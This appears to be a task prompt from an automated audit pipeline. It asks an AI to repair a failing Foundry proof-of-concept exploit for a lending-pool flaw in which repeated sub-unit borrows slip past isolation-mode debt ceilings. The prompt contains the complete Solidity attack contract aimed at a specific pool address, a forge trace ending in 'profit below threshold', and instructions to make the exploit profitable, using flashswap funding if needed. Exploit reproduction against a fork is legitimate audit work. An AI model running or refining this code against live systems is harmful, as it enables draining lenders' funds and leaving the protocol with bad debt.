You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Isolation debt ceilings can be bypassed with repeated sub-unit borrows
- claim: Isolation-mode debt accounting rounds each borrow down to `amount * 10^2 / 10^decimals`. Any borrow smaller than one debt-ceiling accounting unit contributes zero both in the validation check and in `isolationModeTotalDebt` updates, so repeated small borrows never count against the configured ceiling.
- impact: An isolated account can accumulate materially more borrow exposure than governance intended while `isolationModeTotalDebt` stays artificially low, weakening the main solvency guard for isolated collateral and increasing bad-debt exposure if that collateral fails.
- exploit_paths: ["A user enters isolation mode by supplying isolated collateral.", "The user repeatedly borrows a borrowable-in-isolation asset in chunks smaller than `10^(decimals-2)`.", "Each borrow passes `DEBT_CEILING_EXCEEDED` because the tracked increment rounds down to zero.", "The user accumulates debt well above the configured ceiling while on-chain isolation accounting remains understated."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
  function balanceOf(address account) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
  function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
  function getPriceOracle() external view returns (address);
}

struct ReserveConfigurationMap {
  uint256 data;
}

struct ReserveData {
  ReserveConfigurationMap configuration;
  uint128 liquidityIndex;
  uint128 currentLiquidityRate;
  uint128 variableBorrowIndex;
  uint128 currentVariableBorrowRate;
  uint128 currentStableBorrowRate;
  uint40 lastUpdateTimestamp;
  uint16 id;
  address hTokenAddress;
  address stableDebtTokenAddress;
  address variableDebtTokenAddress;
  address interestRateStrategyAddress;
  uint128 accruedToTreasury;
  uint128 unbacked;
  uint128 isolationModeTotalDebt;
}

interface IPoolLike {
  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

  function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external;

  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

  function getReserveData(address asset) external view returns (ReserveData memory);

  function getReservesList() external view returns (address[] memory);

  function ADDRESSES_PROVIDER() external view returns (address);
}

contract FlawVerifier {
  IPoolLike internal constant POOL =
    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);

  uint256 internal constant VARIABLE_RATE_MODE = 2;
  uint256 internal constant ACTIVE_BIT = 56;
  uint256 internal constant FROZEN_BIT = 57;
  uint256 internal constant BORROWING_BIT = 58;
  uint256 internal constant PAUSED_BIT = 60;
  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
  uint256 internal constant DECIMALS_BIT = 48;
  uint256 internal constant DEBT_CEILING_BIT = 212;
  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 256;
  uint256 internal constant LOOP_GAS_FLOOR = 350_000;

  uint8 public constant REASON_NONE = 0;
  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;

  address private _profitToken;
  uint256 private _profitAmount;

  address public selectedCollateralAsset;
  address public selectedDebtAsset;
  uint256 public selectedCollateralBalance;
  uint256 public selectedUnderlyingCollateralBalance;
  uint256 public selectedHTokenCollateralBalance;
  uint256 public selectedCollateralLtv;
  uint256 public selectedDebtCeiling;
  uint256 public selectedDebtDecimals;
  uint256 public selectedDebtAssetLiquidity;
  uint256 public accountingUnitRaw;
  uint256 public borrowChunkRaw;
  uint256 public trackedDebtBefore;
  uint256 public trackedDebtAfter;
  uint256 public remainingCeilingUnitsBefore;
  uint256 public actualCeilingToBypassRaw;
  uint256 public requiredBorrowLoops;
  uint256 public executedBorrowLoops;
  uint256 public actualBorrowedRaw;
  uint8 public infeasibilityReason;
  bool public hypothesisValidated;
  bool public ceilingBypassed;

  uint256 public scannedReserveCount;
  uint256 public isolatedCollateralReserveCount;
  uint256 public borrowableIsolationReserveCount;
  uint256 public lastScannedConfigData;
  address public lastScannedReserve;

  address public poolPriceOracle;
  uint256 public selectedCollateralOraclePrice;
  uint256 public selectedDebtOraclePrice;
  uint256 public maxBorrowableAgainstHeldCollateralRaw;
  uint256 public requiredCollateralValueBase;
  uint256 public bootstrapFundingCostInDebtAssetRaw;
  uint256 public bootstrapProfitShortfallRaw;

  struct Opportunity {
    address collateralAsset;
    uint256 underlyingCollateralBalance;
    uint256 hTokenCollateralBalance;
    uint256 totalCollateralBalance;
    uint256 collateralLtv;
    uint256 collateralDecimals;
    uint256 collateralOraclePrice;
    uint256 debtCeiling;
    uint256 trackedDebt;
    uint256 remainingCeilingUnits;
    address debtAsset;
    uint256 debtAssetLiquidity;
    uint256 debtDecimals;
    uint256 debtOraclePrice;
    uint256 maxBorrowableRaw;
    uint256 targetBorrowRaw;
    uint256 borrowLoops;
  }

  struct CollateralContext {
    address collateralAsset;
    uint256 underlyingCollateralBalance;
    uint256 hTokenCollateralBalance;
    uint256 totalCollateralBalance;
    uint256 collateralLtv;
    uint256 collateralDecimals;
    uint256 collateralOraclePrice;
    uint256 debtCeiling;
    uint256 trackedDebt;
    uint256 remainingCeilingUnits;
  }

  constructor() {}

  function executeOnOpportunity() external {
    _resetRunState();

    Opportunity memory opportunity = _discoverOpportunity();
    if (opportunity.collateralAsset == address(0)) {
      infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
      return;
    }
    if (opportunity.debtAsset == address(0)) {
      infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
      return;
    }

    selectedCollateralAsset = opportunity.collateralAsset;
    selectedDebtAsset = opportunity.debtAsset;
    selectedCollateralBalance = opportunity.totalCollateralBalance;
    selectedUnderlyingCollateralBalance = opportunity.underlyingCollateralBalance;
    selectedHTokenCollateralBalance = opportunity.hTokenCollateralBalance;
    selectedCollateralLtv = opportunity.collateralLtv;
    selectedCollateralOraclePrice = opportunity.collateralOraclePrice;
    selectedDebtCeiling = opportunity.debtCeiling;
    selectedDebtDecimals = opportunity.debtDecimals;
    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
    selectedDebtOraclePrice = opportunity.debtOraclePrice;
    trackedDebtBefore = opportunity.trackedDebt;
    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
    maxBorrowableAgainstHeldCollateralRaw = opportunity.maxBorrowableRaw;

    if (opportunity.debtDecimals <= 2) {
      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
      return;
    }

    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
    borrowChunkRaw = accountingUnitRaw - 1;
    actualCeilingToBypassRaw = opportunity.targetBorrowRaw;
    requiredBorrowLoops = opportunity.borrowLoops;

    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
      return;
    }

    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
      return;
    }

    if (opportunity.totalCollateralBalance == 0) {
      if (!_evaluatePublicLiquidityBootstrap(opportunity)) {
        infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
        return;
      }
    }

    _runDirectPath(opportunity);
  }

  function profitToken() external view returns (address) {
    return _profitToken;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function _runDirectPath(Opportunity memory opportunity) internal {
    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));

    if (opportunity.underlyingCollateralBalance != 0) {
      _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.underlyingCollateralBalance);
      POOL.supply(opportunity.collateralAsset, opportunity.underlyingCollateralBalance, address(this), 0);
    }

    // Existing hTokens already represent supplied isolated collateral. Supplying any held underlying
    // first and then enabling collateral keeps the exploit path unchanged while supporting verifier-held
    // balances seeded by the harness in either underlying or hToken form.
    POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true);

    for (uint256 i = 0; i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR; ++i) {
      (bool ok, ) = address(POOL).call(
        abi.encodeWithSelector(
          IPoolLike.borrow.selector,
          opportunity.debtAsset,
          borrowChunkRaw,
          VARIABLE_RATE_MODE,
          0,
          address(this)
        )
      );
      if (!ok) {
        break;
      }

      ++executedBorrowLoops;
      actualBorrowedRaw += borrowChunkRaw;
      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
        break;
      }
    }

    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;
    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));

    ceilingBypassed =
      actualBorrowedRaw >= actualCeilingToBypassRaw &&
      trackedDebtAfter == trackedDebtBefore;
    hypothesisValidated = ceilingBypassed;

    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
      _profitToken = opportunity.debtAsset;
      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
      return;
    }

    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
  }

  function _evaluatePublicLiquidityBootstrap(Opportunity memory opportunity)
    internal
    returns (bool)
  {
    // Additional funding is only considered after exhausting verifier-held isolated collateral.
    // The realistic public bootstrap is still economically short under honest pricing:
    // the attacker must first source isolated collateral, then borrow a separate isolation-approved
    // asset against it in sub-unit chunks. Because LTV is below 100%, the borrowed proceeds cannot
    // fully fund the collateral principal required to open the position in the first place.
    address oracle = poolPriceOracle;
    if (oracle == address(0)) {
      oracle = IPoolAddressesProviderLike(POOL.ADDRESSES_PROVIDER()).getPriceOracle();
      poolPriceOracle = oracle;
    }

    uint256 debtPrice = IPriceOracleLike(oracle).getAssetPrice(opportunity.debtAsset);
    selectedDebtOraclePrice = debtPrice;
    if (debtPrice == 0 || opportunity.collateralLtv == 0 || opportunity.collateralOraclePrice == 0) {
      return false;
    }

    uint256 borrowValueBase =
      (actualCeilingToBypassRaw * debtPrice) /
      (10 ** opportunity.debtDecimals);
    requiredCollateralValueBase = _ceilDiv(borrowValueBase * 10_000, opportunity.collateralLtv);

    bootstrapFundingCostInDebtAssetRaw = _ceilDiv(
      requiredCollateralValueBase * (10 ** opportunity.debtDecimals),
      debtPrice
    );

    if (bootstrapFundingCostInDebtAssetRaw > actualCeilingToBypassRaw) {
      bootstrapProfitShortfallRaw = bootstrapFundingCostInDebtAssetRaw - actualCeilingToBypassRaw;
      return false;
    }

    return false;
  }

  function _discoverOpportunity() internal returns (Opportunity memory best) {
    address[] memory reserves = POOL.getReservesList();
    scannedReserveCount = reserves.length;

    address oracle = IPoolAddressesProviderLike(POOL.ADDRESSES_PROVIDER()).getPriceOracle();
    poolPriceOracle = oracle;

    for (uint256 i = 0; i < reserves.length; ++i) {
      address asset = reserves[i];
      ReserveData memory reserveData = POOL.getReserveData(asset);
      uint256 configData = reserveData.configuration.data;

      lastScannedReserve = asset;
      lastScannedConfigData = configData;

      if (_isUsableBorrowableIsolationAsset(configData)) {
        ++borrowableIsolationReserveCount;
      }
      if (_isUsableIsolatedCollateral(configData)) {
        ++isolatedCollateralReserveCount;
      }
    }

    for (uint256 i = 0; i < reserves.length; ++i) {
      address collateralAsset = reserves[i];
      ReserveData memory collateralReserve = POOL.getReserveData(collateralAsset);
      uint256 collateralConfig = collateralReserve.configuration.data;
      if (!_isUsableIsolatedCollateral(collateralConfig)) {
        continue;
      }

      CollateralContext memory collateral = CollateralContext({
        collateralAsset: collateralAsset,
        underlyingCollateralBalance: IERC20Like(collateralAsset).balanceOf(address(this)),
        hTokenCollateralBalance: IERC20Like(collateralReserve.hTokenAddress).balanceOf(
          address(this)
        ),
        totalCollateralBalance: 0,
        collateralLtv: _ltv(collateralConfig),
        collateralDecimals: _decimals(collateralConfig),
        collateralOraclePrice: IPriceOracleLike(oracle).getAssetPrice(collateralAsset),
        debtCeiling: _debtCeiling(collateralConfig),
        trackedDebt: collateralReserve.isolationModeTotalDebt,
        remainingCeilingUnits: 0
      });
      collateral.totalCollateralBalance =
        collateral.underlyingCollateralBalance +
        collateral.hTokenCollateralBalance;
      collateral.remainingCeilingUnits = collateral.debtCeiling > collateral.trackedDebt
        ? collateral.debtCeiling - collateral.trackedDebt
        : 0;

      for (uint256 j = 0; j < reserves.length; ++j) {
        Opportunity memory candidate = _buildCandidate(collateral, reserves[j], oracle);

        if (candidate.totalCollateralBalance != 0) {
          if (
            candidate.maxBorrowableRaw < candidate.targetBorrowRaw ||
            candidate.debtAssetLiquidity < candidate.targetBorrowRaw
          ) {
            continue;
          }
        }

        if (_isBetterOpportunity(candidate, best)) {
          best = candidate;
        }
      }
    }
  }

  function _buildCandidate(
    CollateralContext memory collateral,
    address debtAsset,
    address oracle
  ) internal view returns (Opportunity memory candidate) {
    ReserveData memory debtReserve = POOL.getReserveData(debtAsset);
    uint256 debtConfig = debtReserve.configuration.data;
    if (!_isUsableBorrowableIsolationAsset(debtConfig)) {
      return candidate;
    }

    uint256 debtDecimals = _decimals(debtConfig);
    if (debtDecimals <= 2) {
      return candidate;
    }

    uint256 accountingUnit = 10 ** (debtDecimals - 2);
    uint256 chunk = accountingUnit - 1;
    uint256 targetBorrowRaw = collateral.remainingCeilingUnits == 0
      ? chunk
      : collateral.remainingCeilingUnits * accountingUnit + 1;
    uint256 debtPrice = IPriceOracleLike(oracle).getAssetPrice(debtAsset);
    uint256 maxBorrowableRaw = collateral.totalCollateralBalance == 0 ||
      collateral.collateralOraclePrice == 0 ||
      debtPrice == 0
      ? 0
      : _maxBorrowableRaw(
        collateral.totalCollateralBalance,
        collateral.collateralDecimals,
        collateral.collateralOraclePrice,
        collateral.collateralLtv,
        debtDecimals,
        debtPrice
      );

    candidate.collateralAsset = collateral.collateralAsset;
    candidate.underlyingCollateralBalance = collateral.underlyingCollateralBalance;
    candidate.hTokenCollateralBalance = collateral.hTokenCollateralBalance;
    candidate.totalCollateralBalance = collateral.totalCollateralBalance;
    candidate.collateralLtv = collateral.collateralLtv;
    candidate.collateralDecimals = collateral.collateralDecimals;
    candidate.collateralOraclePrice = collateral.collateralOraclePrice;
    candidate.debtCeiling = collateral.debtCeiling;
    candidate.trackedDebt = collateral.trackedDebt;
    candidate.remainingCeilingUnits = collateral.remainingCeilingUnits;
    candidate.debtAsset = debtAsset;
    candidate.debtAssetLiquidity = IERC20Like(debtAsset).balanceOf(debtReserve.hTokenAddress);
    candidate.debtDecimals = debtDecimals;
    candidate.debtOraclePrice = debtPrice;
    candidate.maxBorrowableRaw = maxBorrowableRaw;
    candidate.targetBorrowRaw = targetBorrowRaw;
    candidate.borrowLoops = _ceilDiv(targetBorrowRaw, chunk);
  }

  function _isBetterOpportunity(Opportunity memory candidate, Opportunity memory currentBest)
    internal
    pure
    returns (bool)
  {
    if (candidate.collateralAsset == address(0) || candidate.debtAsset == address(0)) {
      return false;
    }
    if (currentBest.collateralAsset == address(0)) {
      return true;
    }

    bool candidateDirect = candidate.totalCollateralBalance != 0;
    bool bestDirect = currentBest.totalCollateralBalance != 0;
    if (candidateDirect != bestDirect) {
      return candidateDirect;
    }
    if (candidate.debtDecimals != currentBest.debtDecimals) {
      return candidate.debtDecimals > currentBest.debtDecimals;
    }
    if (candidate.borrowLoops != currentBest.borrowLoops) {
      return candidate.borrowLoops < currentBest.borrowLoops;
    }
    if (candidate.targetBorrowRaw != currentBest.targetBorrowRaw) {
      return candidate.targetBorrowRaw > currentBest.targetBorrowRaw;
    }
    if (candidate.maxBorrowableRaw != currentBest.maxBorrowableRaw) {
      return candidate.maxBorrowableRaw > currentBest.maxBorrowableRaw;
    }
    return candidate.debtAssetLiquidity > currentBest.debtAssetLiquidity;
  }

  function _maxBorrowableRaw(
    uint256 collateralBalance,
    uint256 collateralDecimals,
    uint256 collateralPrice,
    uint256 collateralLtv,
    uint256 debtDecimals,
    uint256 debtPrice
  ) internal pure returns (uint256) {
    if (
      collateralBalance == 0 ||
      collateralPrice == 0 ||
      collateralLtv == 0 ||
      debtPrice == 0
    ) {
      return 0;
    }

    uint256 collateralValueBase =
      (collateralBalance * collateralPrice) /
      (10 ** collateralDecimals);
    uint256 maxBorrowValueBase = (collateralValueBase * collateralLtv) / 10_000;
    return (maxBorrowValueBase * (10 ** debtDecimals)) / debtPrice;
  }

  function _safeApprove(address token, address spender, uint256 amount) internal {
    _rawApprove(token, spender, 0);
    _rawApprove(token, spender, amount);
  }

  function _rawApprove(address token, address spender, uint256 amount) internal {
    (bool ok, bytes memory data) = token.call(
      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
    );
    require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
  }

  function _resetRunState() internal {
    _profitToken = address(0);
    _profitAmount = 0;
    selectedCollateralAsset = address(0);
    selectedDebtAsset = address(0);
    selectedCollateralBalance = 0;
    selectedUnderlyingCollateralBalance = 0;
    selectedHTokenCollateralBalance = 0;
    selectedCollateralLtv = 0;
    selectedDebtCeiling = 0;
    selectedDebtDecimals = 0;
    selectedDebtAssetLiquidity = 0;
    accountingUnitRaw = 0;
    borrowChunkRaw = 0;
    trackedDebtBefore = 0;
    trackedDebtAfter = 0;
    remainingCeilingUnitsBefore = 0;
    actualCeilingToBypassRaw = 0;
    requiredBorrowLoops = 0;
    executedBorrowLoops = 0;
    actualBorrowedRaw = 0;
    infeasibilityReason = REASON_NONE;
    hypothesisValidated = false;
    ceilingBypassed = false;
    scannedReserveCount = 0;
    isolatedCollateralReserveCount = 0;
    borrowableIsolationReserveCount = 0;
    lastScannedConfigData = 0;
    lastScannedReserve = address(0);
    poolPriceOracle = address(0);
    selectedCollateralOraclePrice = 0;
    selectedDebtOraclePrice = 0;
    maxBorrowableAgainstHeldCollateralRaw = 0;
    requiredCollateralValueBase = 0;
    bootstrapFundingCostInDebtAssetRaw = 0;
    bootstrapProfitShortfallRaw = 0;
  }

  function _isUsableIsolatedCollateral(uint256 configData) internal pure returns (bool) {
    return
      _flag(configData, ACTIVE_BIT) &&
      !_flag(configData, FROZEN_BIT) &&
      !_flag(configData, PAUSED_BIT) &&
      _ltv(configData) > 0 &&
      _debtCeiling(configData) > 0;
  }

  function _isUsableBorrowableIsolationAsset(uint256 configData) internal pure returns (bool) {
    return
      _flag(configData, ACTIVE_BIT) &&
      !_flag(configData, FROZEN_BIT) &&
      !_flag(configData, PAUSED_BIT) &&
      _flag(configData, BORROWING_BIT) &&
      _flag(configData, BORROWABLE_IN_ISOLATION_BIT);
  }

  function _flag(uint256 configData, uint256 bit) internal pure returns (bool) {
    return ((configData >> bit) & 1) != 0;
  }

  function _ltv(uint256 configData) internal pure returns (uint256) {
    return configData & 0xFFFF;
  }

  function _decimals(uint256 configData) internal pure returns (uint256) {
    return (configData >> DECIMALS_BIT) & 0xFF;
  }

  function _debtCeiling(uint256 configData) internal pure returns (uint256) {
    return (configData >> DEBT_CEILING_BIT) & DEBT_CEILING_MASK;
  }

  function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
    return x == 0 ? 0 : ((x - 1) / y) + 1;
  }
}

```

forge stdout (tail):
```
ebt: 0 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 11417998156997626553342830228427959471725676862296 [1.141e49] }), liquidityIndex: 1004059844026201312107350110 [1.004e27], currentLiquidityRate: 17894652396974755552393909 [1.789e25], variableBorrowIndex: 1009315823614443176223568850 [1.009e27], currentVariableBorrowRate: 45283207682090813324894291 [4.528e25], currentStableBorrowRate: 119396490754927138654852009 [1.193e26], lastUpdateTimestamp: 1697510099 [1.697e9], id: 4, hTokenAddress: 0x58792e9279cC6a178bE5e367A145B75A36f74D90, stableDebtTokenAddress: 0xE876D933180DDccF071e31dD7813b3043E0c6d0e, variableDebtTokenAddress: 0xc60F1FdcAc86251bAC2E7807D7cbeF820F30946A, interestRateStrategyAddress: 0xe1Ed535BBA97076459A7B48E4344Ac0814C8c7aE, accruedToTreasury: 118380122048740296708 [1.183e20], unbacked: 0, isolationModeTotalDebt: 0 })
    │   ├─ [3695] 0x53FbcADa1201A465740F2d64eCdF6FAC425f9030::getReserveData(0xF5C6d9Fc73991F687f158FE30D4A77691a9Fd4d8) [staticcall]
    │   │   ├─ [3100] 0x3a6D9BF8286a4aDa77c15EcF82D4c0C0AF95BE74::getReserveData(0xF5C6d9Fc73991F687f158FE30D4A77691a9Fd4d8) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 11417989849322652800904559010463498745225447741796 [1.141e49] }), liquidityIndex: 1004806495972150169092710410 [1.004e27], currentLiquidityRate: 24757905248459552438796237 [2.475e25], variableBorrowIndex: 1010270837447880442242010484 [1.01e27], currentVariableBorrowRate: 53203437491840952196131711 [5.32e25], currentStableBorrowRate: 138168011353252120976894906 [1.381e26], lastUpdateTimestamp: 1697592131 [1.697e9], id: 5, hTokenAddress: 0x1fC2dD0dCb64E0159B0474CFE6E45985522C9386, stableDebtTokenAddress: 0xeCdeD13a0e539d772d49799A4370AA6020BdF2aE, variableDebtTokenAddress: 0x453E64CB6D391f3f3420A483Cad12eA78AE18AEb, interestRateStrategyAddress: 0x9FA7FCDb88D446172B932Dbc0D64baa1d2b61b57, accruedToTreasury: 502533348029649133947 [5.025e20], unbacked: 0, isolationModeTotalDebt: 0 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 11417989849322652800904559010463498745225447741796 [1.141e49] }), liquidityIndex: 1004806495972150169092710410 [1.004e27], currentLiquidityRate: 24757905248459552438796237 [2.475e25], variableBorrowIndex: 1010270837447880442242010484 [1.01e27], currentVariableBorrowRate: 53203437491840952196131711 [5.32e25], currentStableBorrowRate: 138168011353252120976894906 [1.381e26], lastUpdateTimestamp: 1697592131 [1.697e9], id: 5, hTokenAddress: 0x1fC2dD0dCb64E0159B0474CFE6E45985522C9386, stableDebtTokenAddress: 0xeCdeD13a0e539d772d49799A4370AA6020BdF2aE, variableDebtTokenAddress: 0x453E64CB6D391f3f3420A483Cad12eA78AE18AEb, interestRateStrategyAddress: 0x9FA7FCDb88D446172B932Dbc0D64baa1d2b61b57, accruedToTreasury: 502533348029649133947 [5.025e20], unbacked: 0, isolationModeTotalDebt: 0 })
    │   ├─ [3695] 0x53FbcADa1201A465740F2d64eCdF6FAC425f9030::getReserveData(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   ├─ [3100] 0x3a6D9BF8286a4aDa77c15EcF82D4c0C0AF95BE74::getReserveData(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 11417981543309214043216775446742628088390239917936 [1.141e49] }), liquidityIndex: 1000000000000000000000000000 [1e27], currentLiquidityRate: 0, variableBorrowIndex: 1000000000000000000000000000 [1e27], currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 0, id: 6, hTokenAddress: 0x25126F207Db7dC427415eA640ce0187767403907, stableDebtTokenAddress: 0xc7627963818843482b112D0fd31672F0DF354e3e, variableDebtTokenAddress: 0xC3913D9D34d469a03A464902403fAa656DFCb1B9, interestRateStrategyAddress: 0x6d04402C5433Ff8732152d8ed7DcB542b619E86B, accruedToTreasury: 0, unbacked: 0, isolationModeTotalDebt: 0 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 11417981543309214043216775446742628088390239917936 [1.141e49] }), liquidityIndex: 1000000000000000000000000000 [1e27], currentLiquidityRate: 0, variableBorrowIndex: 1000000000000000000000000000 [1e27], currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 0, id: 6, hTokenAddress: 0x25126F207Db7dC427415eA640ce0187767403907, stableDebtTokenAddress: 0xc7627963818843482b112D0fd31672F0DF354e3e, variableDebtTokenAddress: 0xC3913D9D34d469a03A464902403fAa656DFCb1B9, interestRateStrategyAddress: 0x6d04402C5433Ff8732152d8ed7DcB542b619E86B, accruedToTreasury: 0, unbacked: 0, isolationModeTotalDebt: 0 })
    │   └─ ← [Stop]
    ├─ [543] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [630] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 63.12ms (6.08ms CPU time)

Ran 1 test suite in 165.35ms (63.12ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 486273)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
